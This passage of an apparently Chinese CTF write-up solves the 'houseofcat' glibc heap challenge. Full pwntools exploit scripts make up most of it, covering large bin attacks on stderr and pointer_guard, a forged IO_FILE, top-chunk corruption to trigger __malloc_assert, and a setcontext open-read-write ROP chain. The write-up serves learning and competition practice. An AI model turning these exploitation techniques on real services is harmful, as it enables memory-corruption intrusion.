链子，此时unsortedbin 中的偏大堆块进入 largebin，再申请一个堆块备用：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(13, 0x438, orw)</span><br><span class="line">add(12, 0x438, &#x27;verf1sh&#x27;)</span><br></pre></td></tr></table></figure><ol start="5"><li>释放掉内容为 fake_io_file 的偏小堆块，修改 largebin 的 bk_next 指针指向 stderr-0x20，再申请一个大堆块，达成 large_bin_attack：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">2</span>, p64(libc_base+<span class="number">0x21a0d0</span>)*<span class="number">2</span> + p64(heap_base) + p64(stderr-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x458</span>, <span class="string">&#x27;verf1sh&#x27;</span>)</span><br></pre></td></tr></table></figure><ol start="6"><li>同理，修改 fs[0x30] 即 pointer_guard 为一个堆地址：</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(<span class="number">15</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x450</span>, <span class="string">&#x27;verf1sh&#x27;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">12</span>)</span><br><span class="line">success(<span class="string">&#x27;pointer_guard-0x20 -&gt; &#123;&#125;&#x27;</span>.format(hex(pointer_guard<span class="number">-0x20</span>)))</span><br><span class="line">edit(<span class="number">15</span>, p64(libc_base+<span class="number">0x21a0e0</span>)*<span class="number">2</span> + p64(heap_base+<span class="number">0x860</span>) + p64(pointer_guard<span class="number">-0x20</span>))</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x450</span>, <span class="string">&#x27;verf1sh&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x450</span>, <span class="string">&#x27;verf1sh&#x27;</span>)</span><br></pre></td></tr></table></figure><ol start="7"><li>利用 unsortedbin 和 topchunk 合并的性质，修改 topchunk 的 size：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x460</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x458</span> + p64(<span class="number">0x471</span>))</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x460</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x458</span> + p64(<span class="number">0x451</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x460</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x100</span>))</span><br></pre></td></tr></table></figure><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309252107432.png" alt="image-20230925210737374" style="zoom:50%;" /><ol start="8"><li>申请超过 topchunk 的 size 大小的堆块，触发 __malloc_assert。</li></ol><p>板子如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fake_file = <span class="string">b&#x27;0&#x27;</span> * <span class="number">0x78</span></span><br><span class="line">fake_file += p64(libc_base+<span class="number">0x21ba60</span>)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(io_cookie_jumps_addr+<span class="number">0x18</span>)</span><br><span class="line">fake_file += p64(heap_base + <span class="number">0x10e0</span> + <span class="number">0x450</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)</span><br><span class="line">enc_data =((gadget^(heap_base+<span class="number">0x1960</span>))&gt;&gt;(<span class="number">64</span>-<span class="number">0x11</span>))|((gadget^(heap_base+<span class="number">0x1960</span>))&lt;&lt;<span class="number">0x11</span>)</span><br><span class="line">fake_file += p64(enc_data)</span><br></pre></td></tr></table></figure><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309252128356.png" alt="image-20230925212843307" style="zoom:50%;" /><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309252128354.png" alt="image-20230925212856312"></p><p>其中 heap_base+0x1960 即修改后 pointer_guard 的值（一个堆地址），帮助解密执行 magicgadget。</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309252131279.png" alt="image-20230925213120244" style="zoom:50%;" /><p>最后脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">binary = <span class="string">&#x27;./houseofcat&#x27;</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(binary)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;39.107.237.149&#x27;</span>, <span class="number">15255</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;~\n&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWBQWXF \xff\xff\xff\xff$&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;idx:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">&#x27;content:\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;~\n&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWBQWXF \xff\xff\xff\xff$&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:\n&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;idx:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">p.sendafter(<span class="string">&#x27;content:\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;~\n&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWBQWXF \xff\xff\xff\xff$&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;idx:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;~\n&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWBQWXF \xff\xff\xff\xff$&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:\n&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;idx:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)#, &#x27;b *$rebase(0x181b)&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;LOGIN | r00t QWBQWXF admin&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;~\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = b&#x27;CAT | r00t QWBQWXF \xff\xff\xff\xff$&#x27;</span></span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;~\n&#x27;, payload)</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x428</span>, <span class="string">&#x27;verf1sh&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x428</span>, <span class="string">&#x27;./flag\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># add(2, 0x438, &#x27;verf1sh&#x27;)</span></span><br><span class="line"><span class="comment"># add(3, 0x420, &#x27;verf1sh&#x27;)</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">15</span>, <span class="number">0x448</span>, <span class="string">&#x27;./flag\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">14</span>, <span class="number">0x448</span>, <span class="string">&#x27;./flag\x00&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Context:\n&#x27;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x21a0d0</span></span><br><span class="line">success(<span class="string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">8</span>))<span class="comment">#&amp; 0xfffffffff000</span></span><br><span class="line">success(<span class="string">&#x27;heap_base -&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line">flag_path = heap_base + <span class="number">0x440</span></span><br><span class="line">rtld_global = libc_base + <span class="number">0x278040</span></span><br><span class="line">stderr = libc_base + libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">ret = libc_base + <span class="number">0x0000000000029cd6</span></span><br><span class="line">bin_sh = libc_base + <span class="number">0x00000000001d8698</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span></span><br><span class="line">gadget = libc_base + <span class="number">0x00000000001675b0</span> </span><br><span class="line">io_cookie_jumps_addr = libc_base + <span class="number">0x215b80</span></span><br><span class="line">pointer_guard = libc_base - <span class="number">0x2890</span></span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">b&#x27;0&#x27;</span> * <span class="number">0x78</span></span><br><span class="line">fake_file += p64(libc_base+<span class="number">0x21ba60</span>)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(io_cookie_jumps_addr+<span class="number">0x18</span>)</span><br><span class="line">fake_file += p64(heap_base + <span class="number">0x10e0</span> + <span class="number">0x450</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)</span><br><span class="line">enc_data =((gadget^(heap_base+<span class="number">0x1960</span>))&gt;&gt;(<span class="number">64</span>-<span class="number">0x11</span>))|((gadget^(heap_base+<span class="number">0x1960</span>))&lt;&lt;<span class="number">0x11</span>)</span><br><span class="line">fake_file += p64(enc_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x000000000011f497</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">ret = libc_base + <span class="number">0x0000000000029cd6</span></span><br><span class="line">Read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">Write = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">close = libc_base + libc.sym[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">syscall = Read + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">orw = p64(<span class="number">0</span>) + p64(heap_base+<span class="number">0x10d0</span>+<span class="number">0x460</span>)</span><br><span class="line">orw += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">orw += p64(setcontext+<span class="number">61</span>)</span><br><span class="line">orw += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x78</span></span><br><span class="line">orw += p64(heap_base + <span class="number">0x10e0</span> + <span class="number">0x460</span>+<span class="number">0xa0</span>) + p64(ret)</span><br><span class="line"></span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(close)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(flag_path)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(flag_path)</span><br><span class="line">orw += p64(pop_rdx_ret) + p64(<span class="number">0x41</span>)*<span class="number">2</span></span><br><span class="line">orw += p64(Read)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(Write)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x428</span>, <span class="string">&#x27;verf1sh&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x418</span>, fake_file)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">13</span>, <span class="number">0x438</span>, orw)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x438</span>, <span class="string">&#x27;verf1sh&#x27;</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">2</span>, p64(libc_base+<span class="number">0x21a0d0</span>)*<span class="number">2</span> + p64(heap_base) + p64(stderr-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x458</span>, <span class="string">&#x27;verf1sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">15</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x450</span>, <span class="string">&#x27;verf1sh&#x27;</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">success(<span class="string">&#x27;pointer_guard-0x20 -&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(pointer_guard-<span class="number">0x20</span>)))</span><br><span class="line">edit(<span class="number">15</span>, p64(libc_base+<span class="number">0x21a0e0</span>)*<span class="number">2</span> + p64(heap_base+<span class="number">0x860</span>) + p64(pointer_guard-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x450</span>, <span class="string">&#x27;verf1sh&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x450</span>, <span class="string">&#x27;verf1sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x460</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x458</span> + p64(<span class="number">0x471</span>))</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x460</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x458</span> + p64(<span class="number">0x451</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x460</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x100</span>))</span><br><span class="line">success(<span class="string">&#x27;setcontext -&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(setcontext+<span class="number">61</span>)))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">gdb.attach(p, <span class="string">&quot;b *$rebase(0x177F)&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;~\n&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWBQWXF \xff\xff\xff\xff$&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;idx:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x460</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>注意沙箱禁用了 fd &gt; 2 的文件描述符，因此先 close(0) 再 open 便可拿到文件描述符 0，读出 flag。</p><h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h3><p>同样也是打 stderr+__malloc_assert，但该方法不用劫持 pointer_guard。一次 large_bin_attack 打 stderr，一次 large_bin_attack 打 topchunk 的 size。</p><p>主要的 stderr 构造如下即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">io_addr = heap_base + <span class="number">0x290</span></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>)</span><br><span class="line">fake_IO_FILE +=p64(io_addr+<span class="number">0xb0</span>)<span class="comment">#rdx</span></span><br><span class="line">fake_IO_FILE +=p64(setcontext+<span class="number">61</span>)<span class="comment">#call addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x200</span>)  <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(io_addr+<span class="number">0x30</span>) <span class="comment">#rax1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)  <span class="comment"># _mode = 1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+<span class="number">0x2160d0</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE +=p64(io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE +=p64(orw_addr+<span class="number">0x10</span>)<span class="comment">#orw_addr存放&quot;flag&quot;</span></span><br><span class="line">fake_IO_FILE +=p64(ret)<span class="comment">#setcontext的rcx</span></span><br></pre></td></tr></table></figure><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309261131110.png" alt="image-20230926113141807" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309261133816.png" alt="image-20230926113328714" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309261135507.png" alt="image-20230926113525326" style="zoom:50%;" /><p>EXP 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./houseofcat&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;~\n&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWBQWXF \xff\xff\xff\xff$&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;choice:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;idx:\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;size:\n&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">io.sendafter(<span class="string">b&#x27;content:\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;~\n&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWBQWXF \xff\xff\xff\xff$&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;choice:\n&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;idx:\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">io.sendafter(<span class="string">b&#x27;content:\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;~\n&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWBQWXF \xff\xff\xff\xff$&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;choice:\n&#x27;</span>, <span 